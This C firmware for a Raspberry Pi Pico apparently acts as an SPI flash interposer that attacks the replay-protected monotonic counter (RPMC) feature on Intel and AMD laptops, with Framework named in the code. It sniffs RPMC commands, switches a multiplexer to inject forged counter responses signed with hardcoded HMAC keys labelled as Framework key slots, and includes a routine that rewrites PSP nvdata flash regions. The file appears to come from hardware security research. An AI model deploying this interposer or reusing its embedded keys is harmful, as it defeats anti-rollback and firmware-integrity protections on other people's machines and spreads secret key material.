#include <pico/stdlib.h>
#include <pico/binary_info.h>
#include <pico/multicore.h>
#include <hardware/spi.h>
#include <hardware/clocks.h>
#include <mbedtls/md.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include "spi_sniff.pio.h"
#include "rpmc_sniffer.pio.h"
#include "psp_nvdata.h"


#define PIN_N_MUX_EN 17
bi_decl(bi_1pin_with_name(PIN_N_MUX_EN, "#MUX enable"));
#define PIN_MUX_INTERPOSE 16
bi_decl(bi_1pin_with_name(PIN_MUX_INTERPOSE, "MUX switch (0 is target, 1 is pico)"));

#define PIN_CHIP_VOLT_SEL 23
#define PIN_CHIP_VOLT_MODE 24

// through multiplexer
#define PIN_PICO_OUT_SPI_MOSI_DQ0 12
#define PIN_PICO_OUT_SPI_SCK 13
#define PIN_PICO_OUT_SPI_DQ2 14
#define PIN_PICO_OUT_SPI_CS 15
#define PIN_PICO_OUT_SPI_DQ3 21
#define PIN_PICO_OUT_SPI_MISO_DQ1 22

// directly connected
#define PIN_PICO_BOARD_SPI_MOSI_DQ0 1
#define PIN_PICO_BOARD_SPI_CLK 2
#define PIN_PICO_BOARD_SPI_HOLD_DQ3 3
#define PIN_PICO_BOARD_SPI_WP_DQ2 4
#define PIN_PICO_BOARD_SPI_MISO_DQ1 5
#define PIN_PICO_BOARD_SPI_CS 6


#define HMAC_KEY_SIZE 32

void error(const char * msg)
{
    while (true) {
        puts(msg);
        sleep_ms(500);
    }
}

inline uint32_t reverse(const uint32_t x)
{
    return ((x & UINT32_C(0x0000'00FF)) << 24) |
           ((x & UINT32_C(0x0000'FF00)) <<  8) |
           ((x & UINT32_C(0x00FF'0000)) >>  8) |
           ((x & UINT32_C(0xFF00'0000)) >> 24); 
}

static inline void __time_critical_func(interpose_no_push)()
{
    gpio_set_mask((1 << PIN_MUX_INTERPOSE));
}

static inline void __time_critical_func(interpose)()
{
    interpose_no_push();
    multicore_fifo_push_blocking(132);
}

static inline void __time_critical_func(stop_interpose)()
{
    gpio_clr_mask((1 << PIN_MUX_INTERPOSE));
}

#if 0
void __time_critical_func(rpmc_interpose_increment_core1)(void)
{
    const static uint8_t status[] = {0xff, // to finish the rpmc transmission
                                     0xff, 0x00,
                                     0xff, 0x00,
                                     0xff, 0xff, 0x80,
                                     0xff, 0x00};
    const static size_t status_length[] = {1, 2, 2, 3, 2};
    while (true) {
        multicore_fifo_pop_blocking();

        const uint8_t * status_pos = status;
        
        for (size_t counter = 0; counter < count_of(status_length); counter++) {
            spi_write_blocking(OUTPUT_SPI, status_pos, status_length[counter]);
            status_pos += status_length[counter];
        }

        stop_interpose();
    }
}
#endif

static uint32_t counter_values[4] = {1829, 1814, 0, 0};
// Keys for key_data 01000000
#define USE_KEYS_FRAMEWORK_2
const static uint8_t hmac_keys[4 * HMAC_KEY_SIZE] = {
    # ifdef USE_KEYS_FRAMEWORK_1
    // Key slot 0
    0x70, 0xd1, 0x74, 0x19, 0x8c, 0x7d, 0x97, 0xf0,
    0x3a, 0xd2, 0x8b, 0xfc, 0x5d, 0x86, 0x30, 0xd7,
    0x8e, 0x3f, 0xa4, 0xbe, 0x56, 0x4a, 0x03, 0xd3,
    0xbd, 0x5d, 0x6b, 0x95, 0x3f, 0xa7, 0x18, 0x98,
    // Key slot 1
    0x1b, 0x57, 0xbe, 0x73, 0xb7, 0x48, 0xed, 0xc6,
    0x77, 0x02, 0xfb, 0xa0, 0x7b, 0xfb, 0xb2, 0x69,
    0xc7, 0x36, 0xe8, 0xc2, 0x95, 0x35, 0x4a, 0x98,
    0x8b, 0xc5, 0xff, 0x5a, 0xe7, 0x4c, 0x20, 0x89,
    // Key slot 2
    0x84, 0x35, 0xd3, 0xff, 0x92, 0x04, 0x75, 0xb4,
    0xb1, 0xc9, 0x4f, 0x21, 0x9c, 0x62, 0xa3, 0x54,
    0xea, 0x3a, 0x02, 0x9d, 0x2c, 0x30, 0xaa, 0xaa,
    0x2d, 0x25, 0x1e, 0x93, 0x74, 0x3e, 0x72, 0x9a,
    // Key slot 3
    0x4c, 0xfd, 0x6b, 0x7f, 0xbb, 0x05, 0xa6, 0xb4,
    0x6d, 0xf2, 0x35, 0x03, 0xb2, 0x30, 0x2d, 0xa9,
    0xfb, 0x59, 0xe7, 0x58, 0x2b, 0xa4, 0x2d, 0x5d,
    0x03, 0x74, 0x03, 0x92, 0x3e, 0x2f, 0xeb, 0x28
    #elifdef USE_KEYS_FRAMEWORK_2
    // Key Slot 0
    0xf4, 0x27, 0xad, 0xa3, 0x76, 0x79, 0x6f, 0x27,
    0x78, 0x10, 0x78, 0xb2, 0x0a, 0x6c, 0x68, 0x79,
    0x69, 0x3b, 0x90, 0x35, 0x1b, 0x99, 0x5a, 0xe5,
    0x3b, 0x7c, 0x6e, 0x14, 0x54, 0x6c, 0x69, 0xaa,
    // Key Slot 1
    0x1b, 0x3b, 0x9d, 0x0f, 0xd0, 0x78, 0xee, 0x45,
    0xc1, 0x28, 0xe3, 0xdb, 0x8d, 0x4d, 0xac, 0x6d,
    0x67, 0x21, 0x1a, 0xe6, 0xb6, 0x64, 0x43, 0x27,
    0x7e, 0x10, 0xcd, 0x62, 0x1b, 0x42, 0x08, 0x15,
    // Key Slot 2
    0x3d, 0xfd, 0x42, 0x26, 0x75, 0x56, 0x74, 0x73,
    0x2b, 0x72, 0x71, 0xb3, 0x59, 0xb1, 0xe9, 0x5c,
    0xd4, 0x8c, 0x8e, 0xf9, 0x55, 0x4f, 0xf2, 0x5d,
    0x5b, 0x25, 0x19, 0xc5, 0x24, 0x02, 0xe7, 0x68,
    // Key Slot 3
    0x5e, 0x7d, 0x55, 0xcd, 0x06, 0xbb, 0x1e, 0x07,
    0x91, 0xe6, 0x3b, 0xc3, 0x8a, 0x9b, 0xa0, 0xff,
    0x27, 0xd6, 0x3b, 0x75, 0x53, 0xdc, 0xf7, 0x0d,
    0x31, 0x4e, 0x83, 0xb6, 0x03, 0x6d, 0xaf, 0xa9
    #endif
};

const static uint32_t wait_msg[] = {0xffff0100};
#if 0
const static uint8_t done_msg[52] = {0xff, 0xff, DONE};
#else
//const static uint32_t done_msg[] = {0xffff80de, [1 ... 12] = 0xadbeefde};
#endif

#if 0
const static uint8_t done_update_msg[] = {
	// counter 0
	0xFF, 0xFF, DONE, 0x01, 0x00, 0x00, 0x00, 0x9D, 0xC5, 0xE8, 0xD2, 0x4C,
	0xE7, 0x51, 0x6F, 0x88, 0xA6, 0x68, 0xFD, 0xEC, 0x94, 0x8F, 0x35, 0xF3,
	0xC3, 0xD1, 0x85, 0xF9, 0xCA, 0xCB, 0x50, 0xB4, 0xFF, 0x82, 0xFA, 0x36,
	0xDA, 0xBD, 0x69, 0x21, 0xAA, 0x52, 0xA1, 0x22, 0x84, 0x01, 0x48, 0x04,
	0x46, 0xBA, 0x12, 0xFF,
	// counter 1
	0xFF, 0xFF, DONE, 0x01, 0x00, 0x00, 0x00, 0xC3, 0xC0, 0x92, 0x52, 0xE2,
	0x14, 0x53, 0x43, 0x07, 0xA2, 0x55, 0x5F, 0x0C, 0x86, 0x55, 0xBA, 0xE6,
	0xD7, 0x6E, 0xE7, 0xFD, 0x35, 0x80, 0x76, 0x71, 0x09, 0x3D, 0xFD, 0xED,
	0x11, 0xDD, 0x34, 0x21, 0xAA, 0x52, 0xA1, 0x22, 0x84, 0x01, 0x48, 0x04,
	0x46, 0xBA, 0x12, 0xFF,
	// counter 2
	0xFF, 0xFF, DONE, 0x01, 0x00, 0x00, 0x00, 0x78, 0xE6, 0x05, 0x55, 0xEE,
	0x6B, 0xFE, 0xC1, 0x4E, 0x5C, 0x2D, 0xF0, 0x7F, 0x51, 0x89, 0xFD, 0x65,
	0xDF, 0xD2, 0x2C, 0x4C, 0xFF, 0x08, 0x71, 0x35, 0x2E, 0xFF, 0x24, 0x20,
	0xEE, 0xA9, 0x5E, 0x21, 0xAA, 0x52, 0xA1, 0x22, 0x84, 0x01, 0x48, 0x04,
	0x46, 0xBA, 0x12, 0xFF,
	// counter 3
	0xFF, 0xFF, DONE, 0x01, 0x00, 0x00, 0x00, 0x97, 0xDA, 0xAD, 0x6C, 0xCF,
	0x1B, 0x10, 0xFF, 0x17, 0x3D, 0xE0, 0x05, 0x37, 0xCB, 0xD1, 0x98, 0x46,
	0xC2, 0x97, 0xFD, 0x07, 0xF3, 0x17, 0xE3, 0x00, 0xB7, 0xF4, 0x4C, 0xAB,
	0xCE, 0x38, 0x49, 0x21, 0xAA, 0x52, 0xA1, 0x22, 0x84, 0x01, 0x48, 0x04,
	0x46, 0xBA, 0x12, 0xFF,
};
#else

const static uint32_t done_update_msg[] = {
	// counter 0
	0xFFFF8001, 0x0000009D, 0xC5E8D24C, 0xE7516F88,
	0xA668FDEC, 0x948F35F3, 0xC3D185F9, 0xCACB50B4,
	0xFF82FA36, 0xDABD6921, 0xAA52A122, 0x84014804,
	0x46BA1200,
	// counter 1
	0xFFFF8001, 0x000000C3, 0xC09252E2, 0x14534307,
	0xA2555F0C, 0x8655BAE6, 0xD76EE7FD, 0x35807671,
	0x093DFDED, 0x11DD3421, 0xAA52A122, 0x84014804,
	0x46BA1200,
	// counter 2
	0xFFFF8001, 0x00000078, 0xE60555EE, 0x6BFEC14E,
	0x5C2DF07F, 0x5189FD65, 0xDFD22C4C, 0xFF087135,
	0x2EFF2420, 0xEEA95E21, 0xAA52A122, 0x84014804,
	0x46BA1200,
	// counter 3
	0xFFFF8001, 0x00000097, 0xDAAD6CCF, 0x1B10FF17,
	0x3DE00537, 0xCBD19846, 0xC297FD07, 0xF317E300,
	0xB7F44CAB, 0xCE384921, 0xAA52A122, 0x84014804,
	0x46BA12FF,
};

#endif

// the buffers' sizes must be 4-byte aligned
static_assert(sizeof(wait_msg) % 4 == 0);
//static_assert(sizeof(done_msg) % 4 == 0);
static_assert(sizeof(done_update_msg) % 4 == 0);
static_assert(sizeof(done_update_msg) % 52 == 0);

void __time_critical_func(interpose_intel)()
{
    struct rpmc_command_info info;
    info.dummy[0] = 0xFF; // done_msg[0];
    info.dummy[1] = 0xFF; // done_msg[1];

    set_sys_clock_khz(50000, true);

    /*
     * Intel strategy: let all OP1s pass, but fake the OP2 responses for request
     * commands. (update_hmac_key may go through and increments are only
     * optional since we spoof requests anyways)
     */
    while (true) {
        listen_for_op1(&info);
        continue;

        //printf("Received RPMC command %i to %i\n", info.kind, info.target_counter);

        if (info.kind == INCREMENT) {
            counter_values[info.increment.target]++;
        } else if (info.kind == GET) {
            listen_for_op2_and_mux();

            interposer_send_words(wait_msg, 1);

            // we overwrite the counter address with its value, so we need to
            // calculate this before
            const uint8_t *key = hmac_keys + HMAC_KEY_SIZE * info.get.counter;
            info.get.counter = reverse(counter_values[info.get.counter]);
            mbedtls_md_hmac(mbedtls_md_info_from_type(MBEDTLS_MD_SHA256),
                            key,
                            HMAC_KEY_SIZE,
                            info.get.tag,
                            info.get.signature - info.get.tag,
                            info.get.signature);
            info.status = DONE;

            // send a short done first
            interposer_send_words(done_update_msg, 1);

            size_t size = info.get.end - (uint8_t *)&info;
            static_assert(!(offsetof(struct rpmc_command_info, get.end) % 4));
            interposer_send((const uint8_t *)&info, size);

            interposer_stop();
        } else if (info.kind == UPDATE_HMAC_KEY) {
            listen_for_op2_and_mux();
            //interposer_send_words(wait_msg, 1);

#if 0
            mbedtls_md_hmac(mbedtls_md_info_from_type(MBEDTLS_MD_SHA256),
                            hmac_keys + HMAC_KEY_SIZE * info.update.counter,
                            HMAC_KEY_SIZE,
                            info.update.key_data,
                            info.update.signature - info.update.key_data,
                            info.update.signature);
            info.status = DONE;
#endif


            // status short
            // TODO: this assumes that we always need a short and then a long
            // status. we could make this code more flexible by sending the full
            // done_msg until it was accepted fully (via the return value), but
            // this currently doesn't work due to too long delays. see the TODO
            // comment above interposer_send.
            const uint32_t *msg = done_update_msg + info.update.counter * 13;
            interposer_send_words(msg, 1);

#if 1
            //size_t size = offsetof(struct rpmc_command_info, update.end);
            //static_assert(!(offsetof(struct rpmc_command_info, update.end) % 4));
            //interposer_send((const uint8_t *)&info, size);

            interposer_send_words(msg, 13);
#else
            interposer_send_words(done_update_msg, 13);
            //interposer_send(done_msg, 52);
            //printf("msg: %x, %x, %x, %x, %x, %x, ...\n", msg[7], msg[8], msg[9], msg[10], msg[11], msg[12]);
#endif

            interposer_stop();
        } else {
            // write root key or unknown
            //interposer_stop();
        }
    }
}

#define FLASH_PAGE_SIZE         256
#define FLASH_SECTOR_SIZE       4096

static inline void cs_select(uint cs_pin) {
	asm volatile("nop \n nop \n nop"); // FIXME
	gpio_put(cs_pin, 0);
	asm volatile("nop \n nop \n nop"); // FIXME
}

static inline void cs_deselect(uint cs_pin) {
	asm volatile("nop \n nop \n nop"); // FIXME
	gpio_put(cs_pin, 1);
	asm volatile("nop \n nop \n nop"); // FIXME
}

uint8_t __time_critical_func(get_flash_status)(spi_inst_t *spi, uint cs_pin)
{
    cs_select(cs_pin);
    uint8_t cmd[] = {
        0x05, // Read Status Register
        0
    };
    uint8_t out[sizeof(cmd)];
    spi_write_read_blocking(spi, cmd, out, sizeof(cmd));
    cs_deselect(cs_pin);

    return out[1];
}

void __time_critical_func(flash_erase)(spi_inst_t *spi, uint cs_pin, uint32_t addr) {
	cs_select(cs_pin);
	const uint8_t cmdbuf[] = {
        0x21, // 4-byte addres sector erase
        addr >> 24,
        addr >> 16,
        addr >> 8,
        addr
    };

    spi_write_blocking(spi, cmdbuf, sizeof(cmdbuf));
    //spi_read_blocking(spi, 0, buf, len);
    cs_deselect(cs_pin);
}

void __time_critical_func(flash_write)(spi_inst_t *spi, uint cs_pin, uint32_t addr, const uint8_t * buf, const size_t len) {
	cs_select(cs_pin);
	const uint8_t cmdbuf[] = {
		0x12, // 4-byte page program
        addr >> 24,
		addr >> 16,
		addr >> 8,
		addr
	};

	spi_write_blocking(spi, cmdbuf, sizeof(cmdbuf));
	spi_write_blocking(spi, buf, len);
	cs_deselect(cs_pin);
}

void __time_critical_func(flash_write_enable)(spi_inst_t *spi, uint cs_pin) {
	cs_select(cs_pin);
	const uint8_t cmdbuf[] = {
		0x06, // flash write enable
	};

	spi_write_blocking(spi, cmdbuf, sizeof(cmdbuf));
	cs_deselect(cs_pin);
}

void __time_critical_func(flash_wait_done)(spi_inst_t *spi, uint cs_pin) {
    while (get_flash_status(spi, cs_pin) != 0)
        sleep_us(100);
}

void write_segment(spi_inst_t * const out_spi, const unsigned int cs, const uint32_t base_addres, const size_t len , const uint8_t data[len])
{
    for (uint32_t offset = 0; offset < len; offset += FLASH_PAGE_SIZE) {
        const uint32_t target_addr = base_addres + offset;

        if(target_addr % FLASH_SECTOR_SIZE == 0){
            flash_write_enable(out_spi, cs);
            sleep_us(100);
            flash_erase(out_spi, cs, target_addr);
            sleep_us(100);
            flash_wait_done(out_spi, cs);
            printf("flash_erase: %x\n", target_addr);
        }

        flash_write_enable(out_spi, cs);
        sleep_us(100);
        flash_write(out_spi, cs, target_addr, data + offset, MIN(len - offset, FLASH_PAGE_SIZE));
        sleep_us(100);
        flash_wait_done(out_spi, cs);
        printf("flash_write: %x\n", target_addr);
    }
}

void reprogram_flash(spi_inst_t * const out_spi, const unsigned int cs)
{
    write_segment(out_spi, cs, 0x10e0000, sizeof(psp_nvdata_bin), psp_nvdata_bin);
    write_segment(out_spi, cs, 0x1100000, sizeof(psp_nvram_bin), psp_nvram_bin);
    write_segment(out_spi, cs, 0x1060000, sizeof(nvrom_state_bin), nvrom_state_bin);

    for (uint32_t start = 0x01102000; start  < 0x1100000 + 0x40000; start += FLASH_SECTOR_SIZE) {
        flash_write_enable(out_spi, cs);
        sleep_us(100);
        flash_erase(out_spi, cs, start);
        sleep_us(100);
        flash_wait_done(out_spi, cs);
        printf("flash_erase: %x\n", start);
    }
}

void init_mux()
{
    gpio_init(PIN_N_MUX_EN);
    gpio_put(PIN_N_MUX_EN, 0); // mux is active low
    gpio_set_dir(PIN_N_MUX_EN, GPIO_OUT);

    gpio_init(PIN_MUX_INTERPOSE);
    gpio_put(PIN_MUX_INTERPOSE, 0);
    gpio_set_dir(PIN_MUX_INTERPOSE, GPIO_OUT);
    gpio_set_slew_rate(PIN_MUX_INTERPOSE, GPIO_SLEW_RATE_FAST);
}

#if 0
void init_lls(const bool lls1_dir, const bool lss2_dir)
{
    gpio_init(PIN_N_LLS_OE);
    gpio_put(PIN_N_LLS_OE, 0);
    gpio_set_dir(PIN_N_LLS_OE, GPIO_OUT);

    gpio_init(PIN_LLS_1DIR);
    gpio_put(PIN_LLS_1DIR, lls1_dir);
    gpio_set_dir(PIN_LLS_1DIR, GPIO_OUT);
    gpio_set_slew_rate(PIN_LLS_1DIR, GPIO_SLEW_RATE_FAST);

    gpio_init(PIN_LLS_2DIR);
    gpio_put(PIN_LLS_2DIR, lss2_dir);
    gpio_set_dir(PIN_LLS_2DIR, GPIO_OUT);
}

void init_spi0_master()
{
    spi_init(CAPTURE_SPI, 1 * 1000 * 1000);

    gpio_init(PIN_CHIP_SPI_CS);
    gpio_put(PIN_CHIP_SPI_CS, 1);
    gpio_set_dir(PIN_CHIP_SPI_CS, GPIO_OUT);

    gpio_set_function(PIN_CHIP_SPI_CLK, GPIO_FUNC_SPI);
    gpio_set_function(PIN_CHIP_MASTER_SPI_RX , GPIO_FUNC_SPI);
    gpio_set_function(PIN_CHIP_MASTER_SPI_TX , GPIO_FUNC_SPI);
}

void init_spi1_interposer()
{
    spi_init(OUTPUT_SPI, 25 * 1000 * 1000);
    spi_set_slave(OUTPUT_SPI, true);
    // The spi set format function seems not work as specified in the documentation
    spi_set_format(OUTPUT_SPI, 24, 0, 1, 1);

    gpio_set_function(PIN_PICO_BOARD_SPI_CLK, GPIO_FUNC_SPI);
    gpio_set_function(PIN_PICO_BOARD_SPI_CS, GPIO_FUNC_SPI);
    gpio_set_function(PIN_PICO_BOARD_SPI_TX, GPIO_FUNC_SPI);
    gpio_set_function(PIN_PICO_BOARD_SPI_RX, GPIO_FUNC_SPI);
}
#endif

int main()
{
    stdio_init_all();

    sleep_ms(1000);
    // TODO: write loop um die flash region zu overwriten

    // init mux
    gpio_init_mask64((1 << PIN_MUX_INTERPOSE));
    gpio_set_slew_rate(PIN_MUX_INTERPOSE, GPIO_SLEW_RATE_FAST);
    gpio_set_dir_out_masked64((1 << PIN_MUX_INTERPOSE));

    // initialize voltage switcher
    gpio_init_mask64((1 << PIN_CHIP_VOLT_MODE) | (1 << PIN_CHIP_VOLT_SEL));
    gpio_put(PIN_CHIP_VOLT_MODE, 1); // enable switching voltage
    gpio_put(PIN_CHIP_VOLT_SEL, 1); // use target voltage
    gpio_set_dir_out_masked64((1 << PIN_CHIP_VOLT_MODE) | (1 << PIN_CHIP_VOLT_SEL));

    // setup capture spi
    gpio_init_mask64((1 << PIN_PICO_BOARD_SPI_MOSI_DQ0)
                      | (1 << PIN_PICO_BOARD_SPI_CLK)
                      | (1 << PIN_PICO_BOARD_SPI_HOLD_DQ3)
                      | (1 << PIN_PICO_BOARD_SPI_WP_DQ2)
                      | (1 << PIN_PICO_BOARD_SPI_MISO_DQ1)
                      | (1 << PIN_PICO_OUT_SPI_MISO_DQ1)
                      | (1 << PIN_PICO_BOARD_SPI_CS));
    gpio_set_dir_in_masked64((1 << PIN_PICO_BOARD_SPI_MOSI_DQ0)
                      | (1 << PIN_PICO_BOARD_SPI_CLK)
                      | (1 << PIN_PICO_BOARD_SPI_HOLD_DQ3)
                      | (1 << PIN_PICO_BOARD_SPI_WP_DQ2)
                      | (1 << PIN_PICO_BOARD_SPI_MISO_DQ1)
                      //| (1 << PIN_PICO_OUT_SPI_MISO_DQ1)
                      | (1 << PIN_PICO_BOARD_SPI_CS));

    gpio_set_dir(PIN_PICO_OUT_SPI_MISO_DQ1, true);
    gpio_set_slew_rate(PIN_PICO_OUT_SPI_MISO_DQ1, GPIO_SLEW_RATE_FAST);
    //gpio_set_slew_rate(PIN_PICO_BOARD_SPI_MISO_DQ1, GPIO_SLEW_RATE_FAST);
    //gpio_set_drive_strength(PIN_PICO_OUT_SPI_MISO_DQ1, GPIO_DRIVE_STRENGTH_2MA);
    gpio_disable_pulls(PIN_PICO_BOARD_SPI_MISO_DQ1);
    //gpio_disable_pulls(PIN_PICO_OUT_SPI_MISO_DQ1);
    //gpio_set_drive_strength(PIN_PICO_BOARD_SPI_MISO_DQ1, GPIO_DRIVE_STRENGTH_12MA);
    //gpio_set_dir_out_masked64((1 << PIN_PICO_OUT_SPI_MISO_DQ1));
    
    switch (getchar()) {
        // interpose amd 
        case 'a':
#if 0
            init_mux();
            init_lls(0, 0);
            // initlialize spi trigger
            spi_sniff_init(PIN_CHIP_SPI_CS, PIN_CHIP_SPI_CLK, PIN_CHIP_MASTER_SPI_RX);
            init_spi1_interposer();
            printf("Interposing AMD\n");

            multicore_launch_core1(rpmc_interpose_increment_core1);
            spi_trigger(UINT16_C(0x9b02), interpose);
#endif
            break;
        case 'i':
            // enable the mux (active low)
            //gpio_put(PIN_N_MUX_EN, 1);

            // toggle the mux pin once so that we can see that the pcbite sits
            // correctly
#if 1
            //set_sys_clock_khz(50000, true);
            gpio_put(PIN_MUX_INTERPOSE, 0);
#if 0
            for (unsigned i = 0; i < 10; ++i) {
                gpio_put(PIN_PICO_BOARD_SPI_MISO_DQ1, 1);
                gpio_put(PIN_PICO_BOARD_SPI_MISO_DQ1, 0);
            }
#endif

            //gpio_set_dir(PIN_PICO_BOARD_SPI_MISO_DQ1, true);
            //gpio_set_dir(PIN_PICO_OUT_SPI_MISO_DQ1, true);
            gpio_put(PIN_MUX_INTERPOSE, 1);
            sleep_us(100);
            for (unsigned i = 0; i < 30; ++i) {
#if 1
                //gpio_put(PIN_N_MUX_EN, 0);
                //gpio_put(PIN_PICO_BOARD_SPI_MISO_DQ1, 1);
                gpio_put(PIN_PICO_OUT_SPI_MISO_DQ1, 1);
                gpio_put(PIN_PICO_OUT_SPI_MISO_DQ1, 1);
                //gpio_put(PIN_PICO_BOARD_SPI_MISO_DQ1, 0);
                gpio_put(PIN_PICO_OUT_SPI_MISO_DQ1, 0);
                gpio_put(PIN_PICO_OUT_SPI_MISO_DQ1, 0);
                //gpio_put(PIN_PICO_BOARD_SPI_MISO_DQ1, 1);
                gpio_put(PIN_PICO_OUT_SPI_MISO_DQ1, 1);
                gpio_put(PIN_PICO_OUT_SPI_MISO_DQ1, 1);
                //gpio_put(PIN_PICO_BOARD_SPI_MISO_DQ1, 0);
                gpio_put(PIN_PICO_OUT_SPI_MISO_DQ1, 0);
                gpio_put(PIN_PICO_OUT_SPI_MISO_DQ1, 0);
#if 0
                gpio_put(PIN_PICO_OUT_SPI_MISO_DQ1, 1);
                gpio_put(PIN_PICO_OUT_SPI_MISO_DQ1, 0);
                gpio_put(PIN_PICO_OUT_SPI_MISO_DQ1, 1);
                gpio_put(PIN_PICO_OUT_SPI_MISO_DQ1, 0);
#endif
                //gpio_put(PIN_N_MUX_EN, 1);
#endif
#if 0
                gpio_put(PIN_PICO_OUT_SPI_MISO_DQ1, 1);
                gpio_put(PIN_PICO_OUT_SPI_MISO_DQ1, 0);
                gpio_put(PIN_PICO_BOARD_SPI_MISO_DQ1, 1);
                gpio_put(PIN_PICO_BOARD_SPI_MISO_DQ1, 0);
#endif
            }
            //gpio_set_dir(PIN_PICO_BOARD_SPI_MISO_DQ1, false);
            //gpio_set_dir(PIN_PICO_OUT_SPI_MISO_DQ1, false);
#endif

            // TODO: configure the TPS2116DRL. powering the flash chip with the
            //       1.8V from the pico might make attacks faster but also means
            //       that the flash chip does not power down together with the
            //       framework. this might be fine but could lead to problems if
            //       there are state changes that normally fall back to the
            //       default (e.g. enter 4-byte address mode)

            rpmc_sniffer_init(PIN_PICO_BOARD_SPI_CS, PIN_PICO_BOARD_SPI_CLK, PIN_PICO_BOARD_SPI_MOSI_DQ0, PIN_MUX_INTERPOSE);
            interposer_pio_init(PIN_PICO_BOARD_SPI_CS, PIN_PICO_BOARD_SPI_CLK, PIN_PICO_BOARD_SPI_MOSI_DQ0, PIN_PICO_OUT_SPI_MISO_DQ1, PIN_MUX_INTERPOSE);
            
            printf("Interposing Intel\n");
            //multicore_launch_core1(interpose_intel_core1);
            interpose_intel();
            break;
        case 'r':
#if 0
            init_lls(1, 0);
            init_spi0_master();
            
            printf("Reprogramming flash sector\n");
            reprogram_flash(MASTER_SPI, PIN_CHIP_SPI_CS);
#endif
            break;
        case 't':
            printf("Test\n");
            gpio_put(PIN_N_MUX_EN, 0);
            gpio_put(PIN_MUX_INTERPOSE, 0);

            while (true) {
                gpio_put(PIN_MUX_INTERPOSE, 1);
                sleep_us(100);
                gpio_put(PIN_MUX_INTERPOSE, 0);
                sleep_us(100);
            }
            break;
        default: // do nothing just leave chip directly connected
            gpio_put(PIN_N_MUX_EN, 0);
            gpio_put(PIN_MUX_INTERPOSE, 0);
            printf("Just passing traffic through\n");
            break;
    }

    while (true)
        tight_loop_contents();

    return 0;
}